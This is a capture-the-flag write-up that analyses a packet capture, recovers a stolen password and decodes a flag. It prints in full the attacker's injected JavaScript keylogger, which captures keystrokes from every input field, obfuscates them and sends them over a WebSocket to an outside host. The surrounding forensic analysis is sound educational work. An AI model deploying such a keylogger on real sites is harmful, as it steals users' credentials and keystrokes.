<h1>Logger &ndash; <em>Write-up by @terjanq</em></h1>

<blockquote>
  <h2>Description</h2>
  
  <p>Someone stole my password … (´・ω・｀)
  - [logger.pcap]</p>
  
  <p>(Rev + Net, 200 points)</p>
</blockquote>

<h3>Prolog</h3>

<p>In the task we are provided with only one file [logger.pcap] and with the hint: <em>Someone stole my password</em> ...</p>

<p><code>.pcap</code> is a packet capture extension. To read it I used the popular tool: <code>Wireshark</code></p>

<h3>Packets</h3>

<p>First thing I was searching for in the given logs, were <code>HTTP</code> packets. I quickly noticed <code>POST requests</code> to <code>/login.php</code> which showed the login credentials.</p>

<p>![credentials]</p>

<p>We see that there are parameters: <code>username</code>, <code>cnonce</code> and <code>hash</code>, but no <code>password</code> given. The existence of <code>hash</code> argument indicates that  <code>javascript code</code> had to be used. And indeed there is [bundle.js] file provided as a response of the <code>GET /dist/bundle.js</code> request.</p>

<p>![packets]</p>

<p>There is another interesting packet <code>HTTP/1.1 101 Switching Protocols</code> which indicates that <code>WebSocket tunnel</code> has started.</p>

<h3>Javascript</h3>

<p>As mentioned earlier I fetched the [bundle.js] and the first thing I have tried was to search for part of the code where <code>hash</code> is calculated.</p>

<p><code>js
function(e, t) {
    function i(t) { 
        return e.createHash("sha256").update(t).digest("hex");
    } 
    var r = n(162);
    n.n(r);
    t(function() { 
        t("#submit").on("click", function() { var e = t("input#username").val(),
        n = t("input#password").val(),
        r = t("input#nonce").val(),
        o = Math.random() + "",
        a = i(i(n) + ":" + r + ":" + o); 
        return t.post("login.php", { username: e, cnonce: o, hash: a }, 
            function(e) { e.error ? t("input#nonce").val(e.nonce) : location.reload(!0) }), !1 }) 
    }) 
}.call(t, n(72), n(70))
</code></p>

<p>It can be seen, that in order to calculate the <code>hash</code> I need to know: <code>password</code>, <code>nonce</code> and <code>cnonce</code>, but from these three only last two are known. By looking at the <code>function i()</code> I assume that the function creates a valid, not vulnerable <code>SHA256</code> hash. <br />
As the result of this assumption, I have remembered about <code>WebSocket protocol</code> I noticed before and quickly searched for <code>WebSocket</code> word in the source code.</p>

<h3>Websocket</h3>

<p>After some formatting, I get the injected by an attacker code ([injected.js]) which looks like following:</p>

<p>```js
window.addEventListener("DOMContentLoaded", function() {</p>

<p>function encode(msg, key) {
    var encoded<em>arr = [];
    if (typeof s === "string") msg = (new TextEncoder("utf-8")).encode(msg);
    var i=0, z;
    for (;i &lt; msg.length;i++) if(msg[i]) break;
    z = i;
    for (;i &lt; msg.length;i++) {
      var c = msg[i], j = 0;
      for (;j in encoded</em>arr || c;j++) {
        if (encoded<em>arr[j]) c += encoded</em>arr[j] * 256;
        encoded<em>arr[j] = c % 58;
        c = Math.floor(c / 58);
      }
    }
    return key[0].repeat(z) + encoded</em>arr.reverse().map(x =&gt; key[x]).join("");
  }</p>

<p>function hash(s) {
    var r = 0, i=0;
    for (;i &lt; s.length;i++) r = r * 31 + s.charCodeAt(i) | 0;
    return r;
  }</p>

<p>function rand(s) {
    var x = 123456789, y=362436069, z=521288629, w = 88675123, t;
    return function(a, b) {
      t = x ^ x &lt;&lt; 11;
      x = y; y = z; z = w;
      w = w ^ w &gt;&gt; 19 ^ (t ^ t &gt;&gt; 8);
      if (a !== undefined &amp;&amp; b !== undefined) {
        return a + w % (b + 1 - a);
      }
      return w;
    };
  }</p>

<p>function shuffle(a, r) {
    var i;
    i = a.length - 1;
    for (;i &gt; 0;i--) {
      var j = Math.abs(r(0, i));
      var t = a[i]; a[i] = a[j]; a[j] = t;
    }
  }</p>

<p>var ws = new WebSocket("ws://192.168.99.101:7467");
  var key = "MeitamANbcfv2yXDH1RjPTzVqnLYFhE54uJUkdwCgGB36srQ8o9ZK7WxSp";
  var key2 = key;</p>

<p>ws.addEventListener("open", function(event) {
    var message = navigator.userAgent;
    ws.send(encode(message, key));
    key2 = key.split("");
    shuffle(key2, rand(hash(message)));
    key2 = key2.join("");
  });</p>

<p>Array.from(document.getElementsByTagName("input")).forEach(function(e) {
    e.addEventListener("keyup", function(v) {
      ws.send(encode(Math.random().toString().slice(2) + " " + v.key, key2));
    }, false);
  });</p>

<p>}, false);</p>

<p>```</p>

<p>We can see that communication <em>client-server</em> is encoded (<code>ws.send(encode(message, key))</code>) using two keys <code>key</code> and <code>key2</code>. Initially, our key is equal to <code>MeitamANbcfv2yXDH1RjPTzVqnLYFhE54uJUkdwCgGB36srQ8o9ZK7WxSp</code> and then after some <em>shuffling</em> it transforms to <code>key2</code>. Also, the first message sent via <code>sockets</code> is just client's <code>User-Agent</code> value, which is also used to transform the <code>key</code>. </p>

<p><code>User-Agent</code> is not a secret, because we can easily fetch it from <code>HTTP headers</code>.</p>

<blockquote>
  <p>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36</p>
</blockquote>

<p>To confirm that encode function returns the same encoded message as unmasked packet from <code>Wireshark</code> I evaluated <code>encode()</code> function with <code>User-Agent</code> value as the message and <code>MeitamANbcfv2yXDH1RjPTzVqnLYFhE54uJUkdwCgGB36srQ8o9ZK7WxSp</code> as the key. As expected, the trial has succeeded.</p>

<blockquote>
  <p>WebSocket: T4N8jgYZ5ChvnMJyKyAPCvwAcAmjAhVLt12DeE6SXJQxKsXyv3HL2xKXgASRLHpkDDYRxYQVJt1rNGH6KxyWkkK2gQep84LG33j5N1fzFaxDeXmKfcargKYanYq66KKs9U2XTWEerSwBMCPbsj7faMHQzSkNH</p>
</blockquote>

<p>By looking at functions <code>hash</code>, <code>rand</code> and <code>shuffle</code> we see that there is no any randomization made or any desire of reversing them. So, I just use them to generate they transformed key <code>key2</code>. </p>

<p>The attacker attached a <em>keylogger</em> on every input on the site, which is sending each pressed by user key to external server as an encoded message in form of <code>ws.send("{random} {input_key}", key2)</code>. </p>

<p>I searched for <code>WebSockets</code> packets in <code>Wireshark</code> and I noticed that there are packets of three lengths: <em>~219</em>, <em>~60</em>, <em>~85</em>. First ones are encoded <code>User-Agent messages</code>, second - <code>pings</code> and the last ones are the ones I need - <code>user input</code>.</p>

<p>![websocket]</p>

<p>I dumped those packets into [sockets.txt]</p>

<h3>Decoding</h3>

<p>In order to solve the task, we would like to decode at least the last character of the message. As mentioned already, we don't need to reverse anything except the function <code>encode(msg, key)</code>. Let's have a closer look at it with removing unused parts.</p>

<p>```js
function encode(msg, key) {
    var encoded_arr = [];
    msg = (new TextEncoder("utf-8")).encode( msg );</p>

<pre><code>for (var i = 0; i &lt; msg.length; i++) {
    var c = msg[ i ];
    for (var j = 0; j in encoded_arr || c; j++) {
        if (encoded_arr[ j ]) { 
            c += encoded_arr[ j ] * 256 
        } 
        encoded_arr[ j ] = c % 58;
        c = Math.floor( c / 58 )
    }
}

return encoded_arr.reverse().map( x =&gt; key[x] ).join("")
</code></pre>

<p>}
```</p>

<p>After decent analyze of the function I came to the following conclusions:
- each <code>element</code> of <code>encoded_arr</code> is between [0, 58)
- <code>msg</code> is converted to <code>Uint8Array</code> so its value is between [0, 255]
- <code>key</code> is of length 58 and is used only as a dictionary in return function
- each letter of <code>msg</code> is used as the transofrmation seed of <code>encoded_arr</code></p>

<p>These observations pushed me to the solution of reversing this function by brute-forcing all the possible seeds and all the possible transformations. </p>

<p>Reversing <code>return encoded_arr.reverse().map( x =&gt; key[x] ).join("")</code> is quite easy, since it just replaces each character of reversed <code>encoded_arr</code> with corresponding character in dictionary <code>key[]</code>. The reversion of the code can be done by  <code>encoded_arr.split("").map( x =&gt; key.indexOf(x) ).reverse()</code></p>

<p>To fetch the last character of the word we have to solve the equation: 
<code>
c = seed
c0 = c + prev_encoded_arr[0] * 256
encoded_arr[0] == c0 % 58
</code>
where we only know <code>encoded_arr[0]</code>, and the <code>seed</code> is the searched character of  <code>msg</code></p>

<h3>Solution</h3>

<p>It has to be said, that there will be a lot of solutions <code>(c, prev_encoded_arr[0])</code>, so we should repeat the process deep enough for succeeding elements of <code>prev_encoded_arr[]</code> and our solutions will quickly zip into one-way solution. </p>

<p>In my initial solution, I had used a simple recursive function with deep of 10, and it was enough to solve the task.</p>

<p>```js
var fetched<em>char = "", result = "";
function helper(i, c, encoded</em>arr, c0){
    if( i == 10 ) {
        fetched_char = String.fromCharCode( c );
        return;
    }</p>

<pre><code>for(var r0 = 0; r0 &lt; 58; r0++){
    c0 += r0*256;
    if(encoded_arr[ i ] == c0 % 58){
        helper(i + 1, c, encoded_arr, Math.floor( c0 / 58 ));
    }
}
</code></pre>

<p>}
function decode(encoded<em>arr, key){
    encoded</em>arr = encoded<em>arr.split("");
    encoded</em>arr = encoded_arr.map( x =&gt; key.indexOf(x) ).reverse();</p>

<pre><code>for(var c = 0; c &lt; 256; c++){
    helper(0, c, encoded_arr, c)
}
return fetched_char;
</code></pre>

<p>}
for(var packet of packets){
    result = decode(packet, key2) + result;
}
console.log(result);
 ``<code>
The only issue of this solution was, that not every character is of length 1 (e.g.</code>Shift<code>), and the recieved text contained unwanted</code>t<code>characters:</code>irizaki<em>tmeibuteute</em>tdamashiilaeHtarekazeCTF{t7r1663r<em>th4ppy</em>t61rl}t `.
It wasn't too hard to remove them though and the final flag was: <strong>HarekazeCTF{7r1663r<em>h4ppy</em>61rl}</strong></p>

<p>However this is the simplest solution I can think of, and after the competition ended I've improved the code of [decoder.js] and decoded the whole strings, which are as follows :)</p>

<p>![decoded]</p>

<p>The complete improved solution is included in [decoder.html]</p>

<p>```js
function encode(msg, key) {
    var encoded_arr = [];
    msg = (new TextEncoder("utf-8")).encode( msg );</p>

<pre><code>for (var i = 0; i &lt; msg.length; i++) {
    var c = msg[ i ];
    for (var j = 0; j in encoded_arr || c; j++) {
        if (encoded_arr[ j ]) { 
            c += encoded_arr[ j ] * 256 
        } 
        encoded_arr[ j ] = c % 58;
        c = Math.floor( c / 58 )
    }
}

return encoded_arr.reverse().map( x =&gt; key[x] ).join("")
</code></pre>

<p>}</p>

<p>function helper(i, c, encoded<em>arr, c0, cb){
    if(i == encoded</em>arr.length) {
        if(c0 == 0){
            this.solved = true;
            cb(String.fromCharCode( c ));
        }
        return;
    }
    if(i == 0) this.solved = false;</p>

<pre><code>for(var r0 = 0; r0 &lt; 58; r0++){
    var orig_r0 = encoded_arr[ i ];
    if( this.solved ) return;
    if( encoded_arr[ i ] == (c0 + r0*256) % 58 ){
        encoded_arr[ i ] = r0;
        helper(i + 1, c, encoded_arr, Math.floor( ( c0 + r0*256 ) / 58), cb );
        if( this.solved ) return;
        encoded_arr[ i ] = orig_r0;
    }
}
</code></pre>

<p>}</p>

<p>Array.prototype.back = function(){
    return this[this.length - 1]; 
};</p>

<p>function decode(encoded<em>arr, key){
    encoded</em>arr = encoded<em>arr.split("");
    encoded</em>arr= encoded_arr.map( x =&gt; key.indexOf(x) ).reverse();</p>

<pre><code>var result = "";
var callback = (x) =&gt; result += x;

while(encoded_arr.length){
    for(var c = 0; c &lt; 256; c++)
        helper(0, c, encoded_arr, c, callback);
    while( encoded_arr.length &amp;&amp; !encoded_arr.back() ) encoded_arr.pop();
}

return result.split("").reverse().join("");
</code></pre>

<p>}</p>

<p>function hash(s) {
    var r = 0, i=0;
    for (;i &lt; s.length;i++) r = r * 31 + s.charCodeAt(i) | 0;
    return r;
  }</p>

<p>function rand(s) {
    var x = 123456789, y=362436069, z=521288629, w = 88675123, t;
    return function(a, b) {
      t = x ^ x &lt;&lt; 11;
      x = y; y = z; z = w;
      w = w ^ w &gt;&gt; 19 ^ (t ^ t &gt;&gt; 8);
      if (a !== undefined &amp;&amp; b !== undefined) {
        return a + w % (b + 1 - a);
      }
      return w;
    };
  }</p>

<p>function shuffle(a, r) {
    var i;
    i = a.length - 1;
    for (;i &gt; 0;i--) {
      var j = Math.abs(r(0, i));
      var t = a[i]; a[i] = a[j]; a[j] = t;
    }
  }</p>

<p>var console<em>code = document.querySelector('#console');
var _console = console.log
console.log = function(...args){
    if( console</em>code )
        console_code.innerHTML += args.join(" ") + "\n";
    _console(...args); 
}</p>

<p>var packets = ['iCmUsu3sWAgt1DLDTPiCsMkiJ','iTS5kqhhN6dZgQfzeXgG7yYr5','uKGMC4ZpKpR1Hbek9LnoWag','MENtnhfQx47g2MD4YfaPpapNRA','iBKoHeQsAyZ3yYg5uzbDpVBza','mez8Y8onREos36hbs1W3PrzEVyF','ioHr8fnSqtoRvLkvW6z6YoZLQ','iBKN3429YfCEmRAxT6f9g9Qsv','yvDepd8vhnp8MQNeYfiBKg2L5apQCZ','iDM2FWZnm2fnpYmYGmqVWex27','iDyQ3jA179gqDNzj51e8SzqfP','iDRMoK3vV8dwipy12npBHDCx6','RoAaJ29cybX87mddDKDJdDEw3ZGE29','iDVvjasQqyiaf7vKnNixERsNP','iBz2L9ZX6LUyopeooorQDnwYi','MEBmf8UBvosB98ocQawh9XZ45n','iM4zg74tACAR4XB7khRmL5gLC','iCATz5TGy5jcsCLGWawZSc8zc','iyvVZ3Q5xAVGy1ZLXZFdnXTep','iDS5YadHVaegKNDjYJkamNM8a','yvrGR54rYJj19e75eo1TACqEAuGfow','ioPy4npLFrivepDY4MioMARxZ','iBwMxi5246Xg7UQi2yvJQ8Xg6','iyvVWzDwMaVPLaZYQ2y975QT6','4VXm8RKGEgG95iKCXam1ygN','M77CEgVf6os6K6tjN1M6A9y7pn','MVeeCjRXYXcKdAgCxKFTJgAdZo','meFcfCq8k1CzkESo7i4GDRnhx9n','iyvkbgC3k9R7JTPUESdmeZfzn','oY9P5XbTFsaV4sS2CHBJE3hcYZTQvurTr','iEEhZ5DXWedXQ4iUQbmwrGrs3','dNUzs2v4Vf7U6GdArAhvCmdPtLH8WMviyq','iCAjd7zUWskbSy9RLYjtrZDCV','qPgGDYUvNuUT3Ch1fKgknFW4CPVcWgH','iShnuif7DhNDTetUZMXWG9rLJ','iDSiqPQnncdz6Rs6YGzmeWuqE','iC8FaVhXmb1GYXrCGw5CcuAXC','i7fBGggWJf9LNRdVprPLPpei3','i7fxmXUMpgst9kACHosb91Cka','MECvB5p81fNgVACMmJQsVd6cQB','iiDMtEVW7BUo5ocRRN4inXdQ7','iSEGbN9YJHTXWLQp2JRMcPmFp','iy9KSw2qYEeVA627cyZzH6F6U','iCN8mpZLH7uUp1fUADyGA5P95','MECbuHyU6L65iPw5Asw92EekYa','yvzJxXHW4XEPsncH4zSHDxVZf9tzxk','iBz2LgRNBBfq42MTaCV3wvjCR','iM5bfsw5xU93kTpig2Q4YmS7A','iBYgT3V51QMxRuxhUS1dSm6s2','ME8pn9tTKm3HEkhnFUeXyB7Wtd','iCN5jfUJiqBYWEbP3hhFgDfci','iDVWAJwuudMAi7x7CpNGARxA4','iMGUZeMFtyDcYf7qGpMHfsEvB','iCA3E5NsH2vMvZck9rexTLXG4','horZcydUns9SRFV8wefAJhEYWGwVfxrS','ME131HW8CbVfH26b1XpK6741Kk','iSEGaKaTXheBaHoAFgrF2ncaL','T6Kihw84sq6JnwNc1V6ps5','iDSNbdyahA2wUahbo5oaztjvm','iyvVWY7oECQ2PE3nLMW9ZcR1Q','iidqHMFJ5xshHM4XstWfXvHqJ','hiMU5F4R6qXdTWeiuwuL8so1qCDzsj4m','iC51H2btb9FywrKrgFCqcCUnA','iyvVZ8xTQrukCAiSe6Yrfogg4','i7qb1XR4yhPUzyK1y1k1M1kHH','iyducwzyZxJgeN11VjtYrPnrt','iBwageNmGH9F1Cx7gcK8nhPkC','yWzcku8Ed5ZYasGMqBNny8Cy8ue4hH'];</p>

<p>var key = "MeitamANbcfv2yXDH1RjPTzVqnLYFhE54uJUkdwCgGB36srQ8o9ZK7WxSp";
var msg = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36";</p>

<p>var key2 = key.split("");
shuffle( key2, rand( hash(msg) ) );
key2 = key2.join("")</p>

<p>window.onload = function(){
    var result = ""
    for( packet of packets ){
        var decoded = decode(packet, key2);
        if(/^\d+ .$/.test(decoded)) result += decoded[decoded.length - 1];
        console.log(decoded);
    }</p>

<pre><code>console.log("\n\nFlag: ", result, "\n\n");

var kk = (encode(msg, key));

console.log(`encoding: ${msg}\n\t${kk}\n`);
console.log("decoded: ", decode(kk, key));
</code></pre>

<p>}f
```</p>
